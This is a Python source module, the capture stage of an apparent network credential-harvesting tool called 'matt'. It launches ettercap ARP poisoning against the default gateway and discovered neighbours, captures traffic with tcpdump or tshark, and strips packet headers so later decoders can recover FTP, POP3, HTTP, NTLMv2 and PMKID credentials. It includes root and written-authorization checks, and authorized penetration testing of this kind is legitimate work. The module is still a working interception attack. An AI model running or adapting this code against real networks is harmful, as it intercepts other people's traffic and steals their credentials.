"""matt.capture -- stage 1: get wire bytes, write capture_report.json.

Importing this module must still cost nothing: no sockets, no subprocesses, no
root checks at import time. ``cli`` imports it unconditionally, so anything
eager here would break ``python3 -m matt.cli --help`` for a non-root operator
reading a report offline. That is why every helper degrades to a recorded reason
instead of raising: a missing tcpdump is a line in the report, not a traceback.

THE 144 QUIRK. On this class of box, python-wrapped tshark exits 144
(SIGSTKFLT) instead of dying cleanly. capture_note() surfaces a 144 as its own
kind rather than reporting "0 credentials", because a crashed capture and an
empty network must never look the same on paper.
"""

from __future__ import annotations

import glob
import os
import re
import shutil
import signal
import subprocess
import time

try:
    # Absolute import first so core.py and capture.py can be loaded standalone,
    # which is the only way to import them without model.py pulling in urllib.
    from matt.core import HEX_RE, SIGNAL_144
except ImportError:  # pragma: no cover - relative fallback for an unusual sys.path
    from .core import HEX_RE, SIGNAL_144

__all__ = [
    "REPORT_NAME",
    "SIGNAL_144",
    "GatewayDiscoveryError",
    "live_interface_names",
    "interface_exists",
    "is_root",
    "require_root",
    "require_interface",
    "require_authorization",
    "discover_gateway",
    "discover_clients",
    "start_ettercap",
    "stop_daemon",
    "capture_note",
    "strip_wire_headers",
    "capture_payloads",
    "build_report",
    "find_reports",
]

REPORT_NAME = "capture_report.json"

# tshark -x prints a bare hex offset column ("0000", "0010") before the bytes
_OFFSET_RE = re.compile(r"^[0-9a-fA-F]{2,8}$")
# a run of hex digits with single spaces between groups, e.g. "45 00 0054 1c46"
_HEX_RUN_RE = re.compile(r"[0-9a-fA-F][0-9a-fA-F :]*[0-9a-fA-F]|[0-9a-fA-F]")


class GatewayDiscoveryError(RuntimeError):
    """No gateway could be determined, so poisoning has nothing to target."""


# --------------------------------------------------------------------------
# environment questions
# --------------------------------------------------------------------------

def live_interface_names() -> list:
    """Interface names the kernel knows about right now (no root needed)."""
    try:
        return sorted(p for p in os.listdir("/sys/class/net"))
    except OSError:
        pass
    try:  # non-Linux fallback; may need privileges, so failure is just "unknown"
        import socket  # here, not at module top: importing matt must not pull in socket

        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as sock:
            return sorted({addr[0] for addr in sock.getsocknames()})
    except (OSError, AttributeError, TypeError):  # pragma: no cover - platform dependent
        return []


def interface_exists(name: str) -> bool:
    """True if ``name`` is a real interface on this box."""
    if not name:
        return False
    return os.path.exists(os.path.join("/sys/class/net", name))


def is_root() -> bool:
    try:
        return os.geteuid() == 0
    except AttributeError:  # pragma: no cover - non-POSIX
        return False


def require_root(euid: int = None) -> None:
    """Refuse to poison without root. Raises PermissionError otherwise."""
    euid = os.geteuid() if euid is None else euid
    if euid != 0:
        raise PermissionError(
            f"ARP poisoning needs root and this process is uid {euid}. Run with "
            "sudo, or use --analyze-only to work an existing capture_report.json "
            "without touching the network."
        )


def require_interface(name: str) -> None:
    if not interface_exists(name):
        raise FileNotFoundError(
            f"interface {name!r} does not exist on this machine. Live interfaces: "
            + (", ".join(live_interface_names()) or "none found")
            + ". Use --iface, or --analyze-only to work offline."
        )


def require_authorization(flagged: bool) -> None:
    """Refuse to poison without the written-authorization flag."""
    if not flagged:
        raise PermissionError(
            "ARP poisoning is an active intervention: it rewrites other people's "
            "traffic. Pass --i-have-written-authorization to confirm you hold "
            "written authorization for this network, or use --analyze-only."
        )


def discover_gateway(route: str = None) -> str:
    """Default-route IPv4, read from /proc/net/route. No packets sent.

    ``route`` lets a caller (or a test) hand in the routing table text. Raises
    GatewayDiscoveryError rather than poisoning a guessed address.
    """
    import socket  # here, not at module top: importing matt must not pull in socket

    if route is None:
        try:
            with open("/proc/net/route", "r", encoding="ascii") as handle:
                route = handle.read()
        except OSError as exc:
            raise GatewayDiscoveryError(f"cannot read /proc/net/route: {exc}") from exc
    for line in route.splitlines()[1:]:
        fields = line.split()
        if len(fields) < 4:  # need columns 1..3 (Destination, Gateway, Flags)
            continue
        destination, gateway, flags = fields[1], fields[2], fields[3]
        if destination == "00000000" and int(flags, 16) & 0x2:  # RTF_GATEWAY
            try:
                return socket.inet_ntoa(bytes.fromhex(gateway)[::-1])
            except (ValueError, OSError):
                continue
    raise GatewayDiscoveryError(
        "no default gateway in the routing table, so there is nothing to poison. "
        "Pass --gateway IP, or --analyze-only to stay offline."
    )


def discover_clients(neigh: str = None) -> list:
    """On-link IPv4 neighbours (not failed/incomplete) from `ip neigh` text."""
    if neigh is None:
        if not shutil.which("ip"):
            return []
        try:
            proc = subprocess.run(["ip", "-4", "neigh"], capture_output=True,
                                  text=True, timeout=10, check=False)
        except (OSError, subprocess.SubprocessError):
            return []
        neigh = proc.stdout
    clients: list = []
    for line in neigh.splitlines():
        parts = line.split()
        if len(parts) < 4 or "." not in parts[0]:
            continue
        if "FAILED" in parts or "INCOMPLETE" in parts:
            continue
        clients.append(parts[0])
    return clients


# --------------------------------------------------------------------------
# daemons
# --------------------------------------------------------------------------

def start_ettercap(iface: str, gateway: str, targets: str = None,
                   dry_run: bool = False, runner: str = "sudo",
                   log_path: str = "/tmp/matt-ettercap.log") -> dict:
    """Launch ettercap in the background for ARP poisoning. Returns a status dict.

    Never raises for a missing binary: the reason goes in the report, the run
    continues, and the operator still gets a file to read.
    """
    cmd = [runner, "ettercap", "-T", "-q", "-i", iface, "-w", log_path]
    if gateway:
        cmd += ["-M", "arp:remote", gateway, targets or ""]
    cmd = [part for part in cmd if part != ""]
    status = {"cmd": cmd, "started": False, "pid": None, "reason": ""}
    if dry_run:
        status["reason"] = "dry run: not launched"
        return status
    if not shutil.which("ettercap"):
        status["reason"] = ("ettercap is not installed: capturing passively only. "
                            "Install ettercap, or pass --no-poison to say so on "
                            "purpose.")
        return status
    try:
        with open(log_path, "ab") as log:
            proc = subprocess.Popen(cmd, stdout=log, stderr=log,
                                    stdin=subprocess.DEVNULL,
                                    start_new_session=True)
        status.update(started=True, pid=proc.pid)
    except OSError as exc:
        status["reason"] = f"could not start ettercap: {exc}"
    return status


def stop_daemon(pid: int) -> None:
    """Best-effort terminate, escalate to kill. Safe on a dead pid."""
    if not pid:
        return
    for sig in (signal.SIGTERM, signal.SIGKILL):
        try:
            os.kill(pid, sig)
        except (ProcessLookupError, PermissionError):
            return
        for _ in range(20):
            time.sleep(0.1)
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                return
        # still alive after the grace window: fall through to the next, harder
        # signal (SIGKILL). A `break` here would leave SIGTERM as the only
        # signal ever sent and a wedged ettercap would never be killed.


# --------------------------------------------------------------------------
# stage 1 capture
# --------------------------------------------------------------------------

def capture_note(returncode) -> str:
    """Describe why a capture process produced no payload, honestly."""
    if returncode is None:
        return "capture still running"
    if returncode == SIGNAL_144:
        return (
            "capture process exited 144 (SIGSTKFLT), the known crash when tshark "
            "is python-wrapped on this box. This is a CRASHED capture, not an "
            "empty network: do not record it as zero credentials."
        )
    if returncode == 127:
        return "capture binary not found (127): install tcpdump or tshark"
    if returncode == 126:
        return "capture binary present but not executable (126): run as root"
    if returncode == 2:
        return "capture binary refused the interface (2): wrong iface or no permission"
    if returncode == 124:
        return ("capture ran to its time limit and saw nothing credential-shaped: "
                "an empty window, not a failure")
    return f"capture process exited {returncode}"


def hexdump_row(line: str, min_bytes: int = 16) -> "str | None":
    """Pull the hex out of one tcpdump / tshark -x row, or None if it is not one.

    The accepted shapes are tcpdump's ``0x0030:  4500 0054 1c46 ...`` (an ``0x``
    offset prefix, hex grouped in 2- and 4-byte runs, trailing double space and
    an ASCII gutter) and tshark's plain ``4500 0054 1c46 ...``.

    The offset is stripped as a prefix, never by deleting every colon in the
    line. Deleting colons is what makes a hex body out of
    "12:34:56.789012 IP 10.0.0.5.445 > ..." too, and 38 hex digits is 19 bytes:
    a packet header would arrive as a 19-byte blob whose last byte is a stray
    '2', so a payload's parity would be off by one and every NTLM field in it
    would decode to garbage one byte to the left.
    """
    text = line.strip()
    if not text:
        return None
    if text.startswith("0x"):
        # tcpdump: "0x0000:  <hex>  <ascii>" -- the offset is colon-terminated
        head, sep, tail = text.partition(":")
        if not sep:
            return None
        text = tail.strip()
    else:
        # tshark -x: "0000   <hex>" or "0000  <hex>" -- a bare offset column
        parts = text.split(None, 1)
        if len(parts) == 2 and _OFFSET_RE.match(parts[0]):
            text = parts[1]

    # The hex body and the ASCII gutter are separated by two or more spaces.
    # Split on those runs and keep the LEADING chunks that are pure, space-
    # separated hex byte-groups (2 or 4 digits each); stop at the first chunk
    # that is not -- that chunk is the gutter. tcpdump prints the whole row as
    # one hex column, tshark as two 8-byte columns with a double space between
    # them (so it arrives as two pure-hex chunks, both kept), and the gutter is
    # whatever comes after.
    #
    # This is deliberately NOT a single greedy hex-run regex. The gutter is the
    # payload rendered as text, so it can begin with a hex digit -- byte 0x34 is
    # '4', 0x61 is 'a' -- and a greedy run bridges the two-space gap into that
    # first gutter character, then fails its own shape check and rejects the
    # whole row. On real traffic that silently drops a large fraction of rows
    # (any row whose first gutter character is hex) and shreds packets. A whole
    # gutter chunk, by contrast, is contiguous text and never matches the
    # "space-separated 2-to-4-digit hex groups" shape, so the split stops dead at
    # the boundary regardless of what the gutter's first character is.
    group = re.compile(r"[0-9a-fA-F]{2,4}(?: [0-9a-fA-F]{2,4})*")
    hexparts = []
    for chunk in re.split(r"\s{2,}", text.strip()):
        chunk = chunk.strip().rstrip(":").strip()
        if chunk and group.fullmatch(chunk):
            hexparts.append(chunk.replace(" ", ""))
        else:
            break
    body = "".join(hexparts)
    if len(body) < min_bytes * 2 or len(body) % 2 or not HEX_RE.match(body):
        return None
    return body.lower()


def hexdump_offset(line: str) -> "int | None":
    """The byte offset a hex-dump row declares, or None if it is not one.

    tcpdump prints ``0x0030:`` and tshark a bare ``0030`` column. Every packet's
    rows start again at offset 0, which is how capture_payloads tells one packet
    from the next and reassembles each packet's rows into a single payload --
    without trusting the summary line in between, which differs by tool. A line
    with no offset prefix (a summary line, a blank line, a tcpdump stats line) is
    not a hex row, so it returns None and acts as a packet boundary.
    """
    text = line.strip()
    if not text:
        return None
    if text.startswith("0x"):
        head = text[2:].partition(":")[0]
    else:
        parts = text.split(None, 1)
        if not parts or not _OFFSET_RE.match(parts[0]):
            return None
        head = parts[0]
    try:
        return int(head, 16)
    except ValueError:
        return None


# tcpdump -nn summary line, e.g.
#   12:00:00.100000 IP 10.0.0.5.21 > 10.0.0.1.54321: Flags [P.], ...
#   12:00:00.100000 IP6 fe80::1.546 > ff02::1:2.547: ...
# The address runs up to the LAST dot before the port, so a greedy address class
# (hex, ':' and '.') backtracks to leave the trailing ".<port>" -- which works
# for both IPv4 dotted quads and IPv6 colon addresses. -nn keeps ports numeric.
_SUMMARY_RE = re.compile(
    r"\bIP6?\s+([0-9A-Fa-f:.]+)\.(\d+)\s*>\s*([0-9A-Fa-f:.]+)\.(\d+):")


def parse_summary_ports(line: str) -> "dict | None":
    """Pull {src, sport, dst, dport} out of a tcpdump/tshark summary line, or
    None if the line is not one. Ports are ints. This is what lets the analyzer
    tell FTP (21) from POP3 (110) on a live capture, where the USER/PASS verbs
    are identical and only the port differs."""
    m = _SUMMARY_RE.search(line)
    if not m:
        return None
    try:
        return {"src": m.group(1), "sport": int(m.group(2)),
                "dst": m.group(3), "dport": int(m.group(4))}
    except ValueError:
        return None


_ETHERTYPE_IPV4 = b"\x08\x00"
_ETHERTYPE_IPV6 = b"\x86\xdd"


def strip_wire_headers(raw: bytes) -> bytes:
    """Return just the TCP/UDP application bytes out of one captured frame.

    tcpdump -X / tshark -x hexdump the WHOLE wire frame: an Ethernet header
    (when the link layer has one -- loopback does not), then IP, then TCP or
    UDP, and only THEN the application bytes a credential decoder actually
    wants. Handed that whole frame unstripped, every ^-anchored decoder
    (FTP/POP3/IMAP/SMTP/Telnet, the HTTP Host/request-line scan) fails: the
    application data never starts at offset 0 or right after a '\\n' -- it
    starts right after opaque binary header bytes, so a plaintext "USER
    alice\\r\\nPASS secret\\r\\n" sitting right there in the payload is never
    found. This is the strip that makes those decoders see what they expect.

    Only strips when the shape at each layer actually checks out (a plausible
    Ethernet header + IPv4/IPv6 + TCP/UDP, with lengths that fit inside
    ``raw``); on any doubt it returns ``raw`` unchanged, because handing a
    decoder the whole frame when this cannot be sure is safer than silently
    truncating or corrupting bytes it did not really understand.
    """
    if len(raw) < 20:
        return raw

    offset = 0
    if raw[0] >> 4 not in (4, 6):
        # Not IP at offset 0 (a loopback-style capture, which has no link
        # layer header at all): try skipping a 14-byte Ethernet header,
        # gated on EtherType so a non-IP frame (ARP, 802.1Q, STP, ...) is
        # left alone instead of being misparsed as IP.
        if len(raw) < 14 + 20 or raw[12:14] not in (_ETHERTYPE_IPV4, _ETHERTYPE_IPV6):
            return raw
        offset = 14
        if raw[offset] >> 4 not in (4, 6):
            return raw

    version = raw[offset] >> 4
    if version == 4:
        ihl = (raw[offset] & 0x0F) * 4
        if ihl < 20 or offset + ihl > len(raw):
            return raw
        total_len = (raw[offset + 2] << 8) | raw[offset + 3]
        protocol = raw[offset + 9]
        l4_start = offset + ihl
        ip_end = (offset + total_len if total_len and offset + total_len <= len(raw)
                 else len(raw))
    else:  # version == 6
        if offset + 40 > len(raw):
            return raw
        payload_len = (raw[offset + 4] << 8) | raw[offset + 5]
        protocol = raw[offset + 6]       # next header; extension headers not walked
        l4_start = offset + 40
        ip_end = (l4_start + payload_len if payload_len and l4_start + payload_len <= len(raw)
                 else len(raw))

    if protocol == 6:        # TCP
        if l4_start + 20 > ip_end:
            return raw
        data_offset = (raw[l4_start + 12] >> 4) * 4
        if data_offset < 20 or l4_start + data_offset > ip_end:
            return raw
        payload_start = l4_start + data_offset
    elif protocol == 17:      # UDP
        if l4_start + 8 > ip_end:
            return raw
        payload_start = l4_start + 8
    else:
        return raw            # ICMP, GRE, ... -- nothing MATT decodes as app data

    return raw[payload_start:ip_end]


def capture_payloads(iface: str, duration: float = 5.0, capture_tool: str = None,
                     dry_run: bool = False, runner=None, max_packets: int = 0) -> dict:
    """Grab payload bytes for ``duration`` seconds and return raw hex payloads.

    Uses ``tcpdump -i IFACE -X -s 0`` and treats its hexdump output as the
    payload source, which keeps the whole path subprocess-only. ``runner`` is
    injectable so tests never touch a real interface.

    ``max_packets`` caps the capture at N packets (tcpdump/tshark ``-c``). The
    default 0 means NO packet cap -- the capture is bounded only by ``duration``,
    so a busy link does not truncate the window to its first few hundred frames
    (which an ``-c 200`` cap would fill in well under a second, missing every
    credential that came after).
    """
    tool = capture_tool or ("tcpdump" if shutil.which("tcpdump") else
                            ("tshark" if shutil.which("tshark") else None))
    result = {"tool": tool, "iface": iface, "duration": duration, "payloads": [],
              "returncode": None, "note": "", "bytes": 0}

    if dry_run:
        result["note"] = "dry run: nothing captured"
        return result
    if tool is None:
        result["note"] = ("no capture binary found (looked for tcpdump, tshark); "
                          "install tcpdump, or run --analyze-only against an "
                          "existing " + REPORT_NAME)
        return result

    cap = ["-c", str(max_packets)] if max_packets and max_packets > 0 else []
    if tool == "tcpdump":
        # -X dumps each packet as hex + an ASCII gutter, which is exactly the
        # layout hexdump_row() parses. Without a hex flag tcpdump prints only
        # summary lines, so no payload is ever recovered.
        cmd = [tool, "-i", iface, "-nn", "-X", "-s", "0"] + cap
        # tcpdump has no "run for N seconds then exit" flag that still prints to
        # stdout. Bound it with the `timeout` coreutil: at the duration it sends
        # SIGINT, tcpdump catches it, flushes its hex to stdout, and exits 0,
        # which --preserve-status hands back unchanged. Without a -c cap the whole
        # duration window is captured, not just the first N frames.
        if shutil.which("timeout"):
            cmd = ["timeout", "--preserve-status", "--signal=INT",
                   "%d" % max(1, int(duration))] + cmd
    else:
        # tshark's -a needs its autostop condition as the NEXT argument; a bare
        # "-a -x" makes tshark read "-x" as the condition and abort. Give it a
        # real duration bound and keep -x for the hex output.
        cmd = [tool, "-i", iface, "-x", "-a", "duration:%d" % max(1, int(duration))] + cap

    run = runner or (lambda c, kwargs: subprocess.run(c, **kwargs))
    try:
        proc = run(cmd, {"capture_output": True, "text": True,
                         "timeout": duration + 15, "check": False})
    except subprocess.TimeoutExpired:
        result["note"] = f"{tool} exceeded {duration + 15}s and was stopped"
        return result
    except OSError as exc:
        result["note"] = f"could not run {tool}: {exc}"
        return result

    result["returncode"] = proc.returncode
    stdout = getattr(proc, "stdout", "") or ""
    result["bytes"] = len(stdout)

    # Reassemble each packet from its hex rows, one payload per packet. tcpdump
    # -X and tshark -x both print a packet as a run of "<offset>: <hex>" rows
    # whose offset restarts at 0 for the next packet, with a summary or blank
    # line (not a hex row) in between. Collecting a whole packet into ONE payload
    # is the point of the tool working at all: a single 16-byte row can never
    # hold an NTLMv2 blob, an HTTP POST body, or a PMKID, so decoding row by row
    # would shred every real credential across payload boundaries and recover
    # none of them. hexdump_row is called with min_bytes=1 so a packet's short
    # final row (e.g. the last 8 bytes) is kept instead of silently dropped.
    # Each packet is reassembled together with the ports from the summary line
    # that immediately preceded its hex rows, so the analyzer can disambiguate
    # same-verb protocols (FTP vs POP3) by port on a live capture.
    packets: list = []            # list of (hexstr, meta)
    current: list = []
    current_meta: dict = {}
    pending_meta: dict = {}
    for line in stdout.splitlines():
        offset = hexdump_offset(line)
        body = hexdump_row(line, min_bytes=1) if offset is not None else None
        if body is None:                       # summary / blank / stats line
            if current:
                packets.append(("".join(current), current_meta))
                current = []
                current_meta = {}
            sp = parse_summary_ports(line)
            if sp:
                pending_meta = sp              # belongs to the NEXT packet's rows
            continue
        if offset == 0 and current:            # a new packet started
            packets.append(("".join(current), current_meta))
            current = []
            current_meta = {}
        if not current:                        # first row of a new packet
            current_meta = pending_meta
            pending_meta = {}
        current.append(body)
    if current:
        packets.append(("".join(current), current_meta))
    for packet, meta in packets:
        if not packet:
            continue
        try:
            stripped = strip_wire_headers(bytes.fromhex(packet)).hex()
        except ValueError:  # pragma: no cover - packet is always hex here
            stripped = packet
        if not stripped:   # a header-only frame (bare ACK, etc): no app data
            continue
        # No "protocol" key here: tcpdump/tshark never told us the application
        # protocol, only bytes on a wire, so stamping one on (e.g. "raw") would
        # outrank -- and silently clobber -- whatever a credential decoder
        # itself works out (an FTP login, a TLS ALPN tag). Leave it unset and
        # let the decoder's own, more specific answer carry the finding.
        entry = {"payload": stripped}
        if meta:
            entry["sport"] = meta.get("sport")
            entry["dport"] = meta.get("dport")
            entry["src"] = meta.get("src")
            entry["dst"] = meta.get("dst")
        result["payloads"].append(entry)

    if proc.returncode not in (0, None) and not result["payloads"]:
        result["note"] = capture_note(proc.returncode)
    elif not result["payloads"]:
        result["note"] = ("capture ran clean and saw nothing credential-shaped in "
                          f"{duration}s: that is an empty window, not a failure")
    return result


# --------------------------------------------------------------------------
# report assembly
# --------------------------------------------------------------------------

def build_report(iface: str = None, payloads: list = None, hosts: dict = None,
                 gateway: str = None, clients: list = None, capture: dict = None,
                 poison: dict = None, duration: float = None,
                 tool_versions: dict = None, started: str = None,
                 finished: str = None, mode: str = "live") -> dict:
    """Assemble the stage-1 capture_report dict. Pure: no I/O, no clock calls
    beyond the timestamps handed in by the caller."""
    return {
        "schema": "matt-capture/1",
        "tool": "matt",
        "mode": mode,
        "interface": iface,
        "started": started or "",
        "finished": finished or "",
        "duration_seconds": duration,
        "gateway": gateway,
        "clients": list(clients or []),
        "poison": poison or {},
        "capture": capture or {},
        "payloads": list(payloads or []),
        "hosts": hosts or {},
        "tool_versions": tool_versions or {},
    }


def find_reports(root: str = ".") -> list:
    """capture_report.json files under ``root``, oldest first."""
    found = glob.glob(os.path.join(root, "**", REPORT_NAME), recursive=True)
    return sorted(found, key=lambda path: os.path.getmtime(path))
